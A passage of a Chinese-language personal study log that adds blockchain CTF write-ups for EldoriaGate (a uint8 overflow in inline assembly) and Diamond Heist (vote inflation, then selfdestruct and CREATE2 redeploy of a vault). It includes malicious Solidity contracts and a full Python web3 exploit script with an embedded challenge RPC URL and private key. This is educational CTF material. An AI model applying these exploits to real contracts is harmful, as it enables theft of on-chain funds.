@@ -15,6 +15,854 @@ timezone: UTC+8
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-05
+
+凌晨学完，白天就不用学了（确信）
+
+接着看看CACTF的压轴题EldoriaGate吧：
+
+```solidity
+// EldoriaGate.sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.28;
+
+/***
+    Malakar 1b:22-28, Tales from Eldoria - Eldoria Gates
+  
+    "In ages past, where Eldoria's glory shone,
+     Ancient gates stand, where shadows turn to dust.
+     Only the proven, with deeds and might,
+     May join Eldoria's hallowed, guiding light.
+     Through strict trials, and offerings made,
+     Eldoria's glory, is thus displayed."
+  
+                   ELDORIA GATES
+             *_   _   _   _   _   _ *
+     ^       | `_' `-' `_' `-' `_' `|       ^
+     |       |                      |       |
+     |  (*)  |     .___________     |  \^/  |
+     | _<#>_ |    //           \    | _(#)_ |
+    o+o \ / \0    ||   =====   ||   0/ \ / (=)
+     0'\ ^ /\/    ||           ||   \/\ ^ /`0
+       /_^_\ |    ||    ---    ||   | /_^_\
+       || || |    ||           ||   | || ||
+       d|_|b_T____||___________||___T_d|_|b
+  
+***/
+
+import { EldoriaGateKernel } from "./EldoriaGateKernel.sol";
+
+contract EldoriaGate {
+    EldoriaGateKernel public kernel;
+
+    event VillagerEntered(address villager, uint id, bool authenticated, string[] roles);
+    event UsurperDetected(address villager, uint id, string alertMessage);
+    
+    struct Villager {
+        uint id;
+        bool authenticated;
+        uint8 roles;
+    }
+
+    constructor(bytes4 _secret) {
+        kernel = new EldoriaGateKernel(_secret);
+    }
+
+    function enter(bytes4 passphrase) external payable {
+        bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
+        require(isAuthenticated, "Authentication failed");
+
+        uint8 contribution = uint8(msg.value);        
+        (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
+        string[] memory roles = getVillagerRoles(msg.sender);
+        
+        emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
+    }
+
+    function getVillagerRoles(address _villager) public view returns (string[] memory) {
+        string[8] memory roleNames = [
+            "SERF", 
+            "PEASANT", 
+            "ARTISAN", 
+            "MERCHANT", 
+            "KNIGHT", 
+            "BARON", 
+            "EARL", 
+            "DUKE"
+        ];
+
+        (, , uint8 rolesBitMask) = kernel.villagers(_villager);
+
+        uint8 count = 0;
+        for (uint8 i = 0; i < 8; i++) {
+            if ((rolesBitMask & (1 << i)) != 0) {
+                count++;
+            }
+        }
+
+        string[] memory foundRoles = new string[](count);
+        uint8 index = 0;
+        for (uint8 i = 0; i < 8; i++) {
+            uint8 roleBit = uint8(1) << i; 
+            if (kernel.hasRole(_villager, roleBit)) {
+                foundRoles[index] = roleNames[i];
+                index++;
+            }
+        }
+
+        return foundRoles;
+    }
+
+    function checkUsurper(address _villager) external returns (bool) {
+        (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager);
+        bool isUsurper = authenticated && (rolesBitMask == 0);
+        emit UsurperDetected(
+            _villager,
+            id,
+            "Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach."
+        );
+        return isUsurper;
+    }
+}
+
+
+// EldoriaGateKernal.sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.28;
+
+contract EldoriaGateKernel {
+    bytes4 private eldoriaSecret;
+    mapping(address => Villager) public villagers;
+    address public frontend;
+
+    uint8 public constant ROLE_SERF     = 1 << 0;
+    uint8 public constant ROLE_PEASANT  = 1 << 1;
+    uint8 public constant ROLE_ARTISAN  = 1 << 2;
+    uint8 public constant ROLE_MERCHANT = 1 << 3;
+    uint8 public constant ROLE_KNIGHT   = 1 << 4;
+    uint8 public constant ROLE_BARON    = 1 << 5;
+    uint8 public constant ROLE_EARL     = 1 << 6;
+    uint8 public constant ROLE_DUKE     = 1 << 7;
+    
+    struct Villager {
+        uint id;
+        bool authenticated;
+        uint8 roles;
+    }
+
+    constructor(bytes4 _secret) {
+        eldoriaSecret = _secret;
+        frontend = msg.sender;
+    }
+
+    modifier onlyFrontend() {
+        assembly {
+            if iszero(eq(caller(), sload(frontend.slot))) {
+                revert(0, 0)
+            }
+        }
+        _;
+    }
+
+    function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) {
+        assembly {
+            let secret := sload(eldoriaSecret.slot)            
+            auth := eq(shr(224, _passphrase), secret)
+            mstore(0x80, auth)
+            
+            mstore(0x00, _unknown)
+            mstore(0x20, villagers.slot)
+            let villagerSlot := keccak256(0x00, 0x40)
+            
+            let packed := sload(add(villagerSlot, 1))
+            auth := mload(0x80)
+            let newPacked := or(and(packed, not(0xff)), auth)
+            sstore(add(villagerSlot, 1), newPacked)
+        }
+    }
+
+    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
+        assembly {
+            mstore(0x00, _unknown)
+            mstore(0x20, villagers.slot)
+            let villagerSlot := keccak256(0x00, 0x40)
+
+            mstore(0x00, _unknown)
+            id := keccak256(0x00, 0x20)
+            sstore(villagerSlot, id)
+
+            let storedPacked := sload(add(villagerSlot, 1))
+            let storedAuth := and(storedPacked, 0xff)
+            if iszero(storedAuth) { revert(0, 0) }
+
+            let defaultRolesMask := ROLE_SERF
+            roles := add(defaultRolesMask, _contribution)
+            if lt(roles, defaultRolesMask) { revert(0, 0) }
+
+            let packed := or(storedAuth, shl(8, roles))
+            sstore(add(villagerSlot, 1), packed)
+        }
+    }
+
+    function hasRole(address _villager, uint8 _role) external view returns (bool hasRoleFlag) {
+        assembly {
+            mstore(0x0, _villager)
+            mstore(0x20, villagers.slot)
+            let villagerSlot := keccak256(0x0, 0x40)
+        
+            let packed := sload(add(villagerSlot, 1))
+            let roles := and(shr(8, packed), 0xff)
+            hasRoleFlag := gt(and(roles, _role), 0)
+        }
+    }
+}
+
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.28;
+
+import { EldoriaGate } from "./EldoriaGate.sol";
+
+contract Setup {
+    EldoriaGate public TARGET;
+    address public player;
+
+    event DeployedTarget(address at);
+
+    constructor(bytes4 _secret, address _player) {
+        TARGET = new EldoriaGate(_secret);
+        player = _player;
+        emit DeployedTarget(address(TARGET));
+    }
+
+    function isSolved() public returns (bool) {
+        return TARGET.checkUsurper(player);
+    }
+}
+```
+
+由题意我们需要使得`checkUsurper()`返回为True，而与之对应的是要让我们的role为0，其默认的值为`ROLE_SERF`即1
+
+说句实话题目合约真没有什么能让我们交互的，因此说白了就是通过调用`enter()`来实现修改role的操作，那就让我们一步步看：
+
+首先会进行一次`authenticate(bytes4 passphrase)`去匹配密码是否正确，而密码被存放在Kernal的Storage Slot 0处，因此我们直接用cast去获取指定存储槽内数据即可
+
+通过认证后会调用Kernal的`evaluateIdentity`，而其中的`contribution`参数为我们发送的`msg.value`，好巧不巧Kernal中的实现里面判断role是通过`add(defaultRoleMask, _contribution)`实现的，虽然后面有`lt`小于判断，但是由于使用的是assembly，而且role是uint8数据类型，因此会存在整型溢出，所以只需要让`_contribution`为255就能让我们的role为0，从而解出本题
+
+由于使用了非合约操作进行解题，这里就不放解题合约了，总之就是使用`cast storage --rpc-url "your rpc url" "kernal address" 0`读取Storage Slot获取密码后调用`enter{value: 255 wei}(password)`即可
+
+暂且这样吧，明天开始复现一下那些纯Blockchain的CTF题
+
+
+
+以防有人说我水，这里再放一个RemedyCTF最简单的题（除去签到题）Diamond Heist的Writeup，附件这里就不给出来了，6个合约杀了我吧（
+
+这道题总共有6个合约，看起来非常恐怖，但是实际上是所有题目里面解出数第2高的（第1是签到）
+
+- 首先分析Challenge.sol，里面的要求非常简单：获取所有的Diamond代币即可，然后初始给了自己10000 ether的HexensCoin代币，并且将所有的Diamond代币转到了Vault里
+- VaultFactory.sol和名字一样，就是一个合约工厂，通过salt生成Vault合约，所以使用的是`CREATE2`操作码，至于使用的salt在Challenge.sol里面有，此处按下不表
+- Diamond.sol很直白，就是一个普通的ERC20合约，知道这一点就行
+- Burner.sol，一个销毁用合约，很直白
+- 接下来是两个核心合约：首先来看HexensCoin.sol，这个合约也是一个ERC20合约，唯一的差别就是它添加了一个delegate机制（委托机制）：根据委托人所持有的HexensCoin数量，增加被委托人的Votes（即票数），而用户所持有的Votes数量仅在调用`_moveDelegates`函数的时候进行更新，且获取Votes仅会读取上一个Checkpoint的Votes数 但是问题就在于委托人将自己持有的HexensCoin通过transfer转移给其它用户的时候，被委托人的Votes仍旧不会发生改变（缺少了`beforeTokenTransfer`的override），因此这会导致Votes数可以刷上去，比如统一给A刷票，那首先让B调用`delegate(address(A))`后将自己的HexensCoin转给C，再让C进行delegate，以此类推
+- 最后是Vault.sol，这是一个UUPS可升级代理合约，说明我们可以对这个合约进行升级，同时可以指定合约的implementation，也就是说我们可以尝试通过升级这个合约来达成恶意的操作；至于`governanceCall`我们可以通过刚刚提到的刷票方法进行调用，而`burn`的话则是可以让我们“销毁”掉Vault中所有的Diamond，至于为什么带双引号这里先卖个关子
+
+注意看题目附件中的Challenge.py，里面说明本题区块链的分叉为Shanghai分叉，也就是说此时`selfdestruct`仍然可以在constructor以外被调用时删除合约字节码，因此我们可以销毁掉Vault再重新部署一个新的Vault并初始化，这样我们就拥有了金库的所有权；同时这个金库还可以升级为添加了恶意函数的金库，从而达成获取所有Diamond代币的目的
+
+接下来我们回收一下伏笔：Burner自毁的操作，实际上只销毁了所有的ETH（甚至也没有，因为参数是`payable(address(this))`，也就是把ETH发送到本地址后销毁，ETH还在这个地址），而ERC20并不会随之消失，因为ERC20本质上还是一个合约，而ERC20的数量本质上也是合约的一个mapping的value，因此“被销毁的Diamond”仍然保留在创建的Burner的地址中
+
+那么此时就到了高潮部分：已知创建Burner的时候使用的语句是new，说明使用的是CREATE操作码，而nonce是1（即Burner是Vault创建的第1个合约），所以如果我们重新创建的Vault的地址是一样的，那么创建的Burner的地址也是一样的；而创建Vault的时候使用的又是CREATE2，合约工厂地址固定、salt已知，所以我们只需要控制新创建的Vault的init_code（也就是constructor部分）一致就能保证新建的Vault一定是原先的Vault的地址
+
+因此我们可以给原先的Vault添加2个新的函数：（`x.sol`）
+
+```Solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.13;
+
+import "./openzeppelin-contracts/interfaces/IERC20.sol";
+import "./openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
+import "./openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
+import "./openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import "./openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
+
+import "./Diamond.sol";
+import "./Burner2.sol";
+import "./HexensCoin.sol";
+
+contract X is Initializable, UUPSUpgradeable, OwnableUpgradeable {
+    uint public constant AUTHORITY_THRESHOLD = 100_000 ether;
+
+    Diamond diamond;
+    HexensCoin hexensCoin;
+
+    function initialize(
+        address diamond_,
+        address hexensCoin_
+    ) public initializer {
+        __Ownable_init();
+        diamond = Diamond(diamond_);
+        hexensCoin = HexensCoin(hexensCoin_);
+    }
+
+    function governanceCall(bytes calldata data) external {
+        require(
+            msg.sender == owner() ||
+                hexensCoin.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD
+        );
+        (bool success, ) = address(this).call(data);
+        require(success);
+    }
+
+    function burn(address token, uint amount) external {
+        require(msg.sender == owner() || msg.sender == address(this));
+        Burner burner = new Burner();
+        IERC20(token).transfer(address(burner), amount);
+        burner.destruct();
+    }
+
+    function _authorizeUpgrade(address) internal view override {
+        require(msg.sender == owner() || msg.sender == address(this));
+        require(IERC20(diamond).balanceOf(address(this)) == 0);
+    }
+
+    function _selfdestruct() public {
+        selfdestruct(payable(address(this)));
+    }
+
+    function new_sender() public {
+        Burner burner = new Burner();
+        burner.destruct2(address(diamond));
+        IERC20(diamond).transfer(msg.sender, 31337);
+    }
+}
+```
+
+我们这个恶意的Vault添加了自毁函数以方便我们重新部署合约并获得owner权限，同时添加了`new_sender`函数创建并使用我们恶意的Burner合约将“被销毁”的Diamond重新发送给恶意Vault并最终发送到我们自己手上
+
+恶意的Burner合约如下：（`Burner2.sol`）
+
+```Solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.13;
+
+import "./Diamond.sol";
+
+contract Burner {
+    Diamond diamond;
+
+    constructor() {}
+
+    function destruct() external {
+        selfdestruct(payable(address(this)));
+    }
+
+    function destruct2(address _diamond) external {
+        diamond = Diamond(_diamond);
+        diamond.transfer(msg.sender, 31337);
+    }
+}
+```
+
+那么至此我们的攻击路径就基本完成了：
+
+[![0.png](https://i.postimg.cc/m2ZbdPCg/0.png)](https://postimg.cc/8s3QcPZ2)
+
+可能有人会问：为什么要销毁再创建新的Vault？我升级后直接调用new_sender不就好了？欸，还记得CREATE操作码的nonce是什么吗？是这个合约已创建的合约数+1，也就是说如果此时调用new_sender那么nonce是2，那么我们是无法获取到Diamond的（因为压根就不在那），销毁是为了重置这个nonce，就这么简单
+
+那么这里就给出一个（应该能够运行的）脚本吧，别被吓到了，大部分都是合约的ABI，核心逻辑在后面
+
+```Python
+from web3 import Web3
+from eth_account import Account
+import solcx
+
+# Configuration
+RPC_URL = "http://164.90.231.253:8545/RARSiytkQIREDxCMlQjaKzzX/main"
+PRIVATE_KEY = "0x85aa8a192685c1994e222fa9abf0c5a3156d03f8da6f0712477bcd8f1d35bcd5"
+CHALLENGE_ADDRESS = "0xDb95DC78E696E454bAEC14570523bba1397bF4d0"
+w3 = Web3(Web3.HTTPProvider(RPC_URL))
+account = Account.from_key(PRIVATE_KEY)
+
+def send_transaction(contract_function, account, privKey=PRIVATE_KEY):
+    """Helper function to send transactions"""
+    transaction = contract_function.build_transaction(
+        {
+            "from": account.address,
+            "nonce": w3.eth.get_transaction_count(account.address),
+            "gas": 500000,
+            "maxFeePerGas": w3.eth.gas_price * 2,
+            "maxPriorityFeePerGas": w3.eth.gas_price,
+        }
+    )
+
+    signed_txn = w3.eth.account.sign_transaction(transaction, privKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    return receipt
+
+def transfer(to, amount):
+    tx = {
+        "from": account.address,
+        "to": to,
+        "value": amount,
+        "gas": 500000,
+        "gasPrice": w3.eth.gas_price,
+        "nonce": w3.eth.get_transaction_count(account.address),
+    }
+
+    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    return receipt
+
+def main():
+    print(f"Connected to network. Chain ID: {w3.eth.chain_id}")
+    print(f"Using account: {account.address}")
+
+    _solc_version = "0.8.13"
+    solcx.set_solc_version(_solc_version)
+    # Contract ABIs
+    challenge = w3.eth.contract(
+        address=CHALLENGE_ADDRESS,
+        abi=[
+            {
+                "inputs": [],
+                "name": "claim",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "player", "type": "address"}
+                ],
+                "stateMutability": "nonpayable",
+                "type": "constructor",
+            },
+            {
+                "inputs": [],
+                "name": "diamond",
+                "outputs": [
+                    {"internalType": "contract Diamond", "name": "", "type": "address"}
+                ],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "DIAMONDS",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "HEXENS_COINS",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "hexensCoin",
+                "outputs": [
+                    {
+                        "internalType": "contract HexensCoin",
+                        "name": "",
+                        "type": "address",
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "isSolved",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "PLAYER",
+                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "vault",
+                "outputs": [
+                    {"internalType": "contract Vault", "name": "", "type": "address"}
+                ],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "vaultFactory",
+                "outputs": [
+                    {
+                        "internalType": "contract VaultFactory",
+                        "name": "",
+                        "type": "address",
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function",
+            },
+        ],
+    )
+
+    # Get contract addresses
+    hexens_coin_addr = challenge.functions.hexensCoin().call()
+    vault_addr = challenge.functions.vault().call()
+    vaultFactory_addr = challenge.functions.vaultFactory().call()
+
+    print(f"HexensCoin address: {hexens_coin_addr}")
+    print(f"Vault address: {vault_addr}")
+    print(f"VaultFactory address: {vaultFactory_addr}")
+
+    hexens_coin = w3.eth.contract(
+        address=hexens_coin_addr,
+        abi=[
+            {
+                "type": "function",
+                "name": "delegate",
+                "inputs": [
+                    {"name": "delegatee", "type": "address", "internalType": "address"}
+                ],
+                "outputs": [],
+                "stateMutability": "nonpayable",
+            },
+            {
+                "type": "function",
+                "name": "transfer",
+                "inputs": [
+                    {"name": "to", "type": "address", "internalType": "address"},
+                    {"name": "amount", "type": "uint256", "internalType": "uint256"},
+                ],
+                "outputs": [{"name": "", "type": "bool", "internalType": "bool"}],
+                "stateMutability": "nonpayable",
+            },
+            {
+                "type": "function",
+                "name": "balanceOf",
+                "inputs": [
+                    {"name": "account", "type": "address", "internalType": "address"}
+                ],
+                "outputs": [{"name": "", "type": "uint256", "internalType": "uint256"}],
+                "stateMutability": "view",
+            },
+            {
+                "type": "function",
+                "name": "getCurrentVotes",
+                "inputs": [
+                    {"name": "account", "type": "address", "internalType": "address"}
+                ],
+                "outputs": [{"name": "", "type": "uint256", "internalType": "uint256"}],
+                "stateMutability": "view",
+            },
+        ],
+    )
+
+    vault = w3.eth.contract(
+        address=vault_addr,
+        abi=[
+            {
+                "inputs": [{"internalType": "bytes", "name": "data", "type": "bytes"}],
+                "name": "governanceCall",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            },
+        ],
+    )
+
+    diamond_addr = challenge.functions.diamond().call()
+    print(f"Diamond address: {diamond_addr}")
+    diamond_addr = challenge.functions.diamond().call()
+    diamond = w3.eth.contract(
+        address=diamond_addr,
+        abi=[
+            {
+                "inputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "totalSupply_",
+                        "type": "uint256",
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "constructor",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "owner", "type": "address"},
+                    {"internalType": "address", "name": "spender", "type": "address"},
+                    {"internalType": "uint256", "name": "value", "type": "uint256"},
+                ],
+                "name": "Approval",
+                "type": "event",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "from", "type": "address"},
+                    {"internalType": "address", "name": "to", "type": "address"},
+                    {"internalType": "uint256", "name": "value", "type": "uint256"},
+                ],
+                "name": "Transfer",
+                "type": "event",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "owner", "type": "address"},
+                    {"internalType": "address", "name": "spender", "type": "address"},
+                ],
+                "name": "allowance",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "spender", "type": "address"},
+                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
+                ],
+                "name": "approve",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "account", "type": "address"}
+                ],
+                "name": "balanceOf",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "decimals",
+                "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "spender", "type": "address"},
+                    {
+                        "internalType": "uint256",
+                        "name": "subtractedValue",
+                        "type": "uint256",
+                    },
+                ],
+                "name": "decreaseAllowance",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "spender", "type": "address"},
+                    {
+                        "internalType": "uint256",
+                        "name": "addedValue",
+                        "type": "uint256",
+                    },
+                ],
+                "name": "increaseAllowance",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "name",
+                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "symbol",
+                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [],
+                "name": "totalSupply",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "to", "type": "address"},
+                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
+                ],
+                "name": "transfer",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "from", "type": "address"},
+                    {"internalType": "address", "name": "to", "type": "address"},
+                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
+                ],
+                "name": "transferFrom",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            },
+        ],
+    )
+    vaultFactory = w3.eth.contract(
+        address=vaultFactory_addr,
+        abi=[
+            {
+                "inputs": [
+                    {"internalType": "bytes32", "name": "salt_", "type": "bytes32"}
+                ],
+                "name": "createVault",
+                "outputs": [
+                    {"internalType": "contract Vault", "name": "", "type": "address"}
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function",
+            }
+        ],
+    )
+
+    print(f"Diamond balance: {diamond.functions.balanceOf(vault_addr).call() = }")
+    print("Transferring tokens to accounts...")
+    accounts = [
+        [Account.from_key(f"0x{hex(i)[2:]:0>64}"), f"0x{hex(i)[2:]:0>64}"]
+        for i in range(1, 12)
+    ]
+    for i in accounts:
+        transfer(i[0].address, 10000000000000000)
+        print(f"Transferred 10^16 tokens to {i[0].address}")
+
+    # 1. Claim initial tokens
+    print("\nClaiming initial tokens...")
+    send_transaction(
+        challenge.functions.claim(), accounts[0][0], privKey=accounts[0][1]
+    )
+    balance = hexens_coin.functions.balanceOf(accounts[0][0].address).call()
+    print(f"Balance of account 0: {balance}")
+
+    # 2. attack
+    print("\nAttacking...")
+    if (
+        int(hexens_coin.functions.getCurrentVotes(account.address).call())
+        < 100000000000000000000000
+    ):
+        for i in range(10):
+            send_transaction(
+                hexens_coin.functions.delegate(account.address),
+                accounts[i][0],
+                privKey=accounts[i][1],
+            )
+            send_transaction(
+                hexens_coin.functions.transfer(
+                    accounts[i + 1][0].address, 10000000000000000000000
+                ),
+                accounts[i][0],
+                privKey=accounts[i][1],
+            )
+            currentVote = hexens_coin.functions.getCurrentVotes(account.address).call()
+            print(f"Current votes of account: {currentVote}")
+
+    def deploy_contract(w3, x_abi, x_bin):
+        construct_txn = (
+            w3.eth.contract(abi=x_abi, bytecode=x_bin)
+            .constructor(diamond_addr, hexens_coin_addr)
+            .build_transaction(
+                {
+                    "from": account.address,
+                    "nonce": w3.eth.get_transaction_count(account.address),
+                }
+            )
+        )
+        tx_create = w3.eth.account.sign_transaction(construct_txn, PRIVATE_KEY)
+        tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
+        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+        print(f"Contract deployed at address: { tx_receipt.contractAddress }")
+
+        return tx_receipt.contractAddress
+
+    x_meta = solcx.compile_files(
+        ["x.sol"], output_values=["abi", "bin"], solc_version=_solc_version
+    )
+    x_abi = x_meta["x.sol:X"]["abi"]
+    x_bin = x_meta["x.sol:X"]["bin"]
+    x_address = deploy_contract(w3, x_abi, x_bin)
+    # x_address = "0xaDFF41E489b5517A26bb2AbF3bE6c960740D4E09"
+
+    # x_instance = w3.eth.contract(address=x_address, abi=x_abi)
+    dark_vault = w3.eth.contract(address=vault_addr, abi=x_abi)
+
+    governance_call_function = "governanceCall(bytes)"
+    burn_function_signature = "burn(address,uint256)"
+    burn_function_signature
+    upgradeTo_function_signature = "upgradeTo(address)"
+    # Encode the "burn" function calldata
+    amount = 31337
+    burn_function_selector = w3.keccak(text=burn_function_signature)[
+        :4
+    ]  # First 4 bytes of the function selector
+    encoded_token = w3.to_bytes(
+        hexstr=w3.to_checksum_address(diamond_addr)[2:].zfill(64)
+    )  # Address encoded to 32 bytes
+    encoded_amount = amount.to_bytes(32, byteorder="big")  # Amount encoded to 32 bytes
+
+    calldata = burn_function_selector + encoded_token + encoded_amount
+    send_transaction(vault.functions.governanceCall(calldata), account)
+
+    print(f"Diamond balance: {diamond.functions.balanceOf(vault_addr).call() = }")
+
+    # Encode the "upgradeTo" function
+    upgradeTo_function_selector = w3.keccak(text=upgradeTo_function_signature)[
+        :4
+    ]  # First 4 bytes of the function selector
+    encoded_token = w3.to_bytes(
+        hexstr=w3.to_checksum_address(x_address)[2:].zfill(64)
+    )  # Address encoded to 32 bytes
+
+    calldata = upgradeTo_function_selector + encoded_token
+    send_transaction(vault.functions.governanceCall(calldata), account)
+    # Selfdestruct the vault
+    send_transaction(dark_vault.functions._selfdestruct(), account)
+
+    # Create a new vault using vaultFactory
+    salt_ = w3.solidity_keccak(
+        ["string"],
+        ["The tea in Nepal is very hot. But the coffee in Peru is much hotter."],
+    )
+    send_transaction(vaultFactory.functions.createVault(salt_), account)
+
+    # Initialization, and we can gain ownership of the vault, no need to attack again
+    send_transaction(
+        dark_vault.functions.initialize(diamond_addr, hexens_coin_addr), account
+    )
+    # Upgrade to the dark vault again
+    send_transaction(vault.functions.governanceCall(calldata), account)
+
+    # Gain diamonds!
+    send_transaction(dark_vault.functions.new_sender(), account)
+
+if __name__ == "__main__":
+    main()
+```
+
 # 2025-08-04
 
 太久没学Web3了，今天作为打卡第一天，先稍微做点简单题热身一下吧
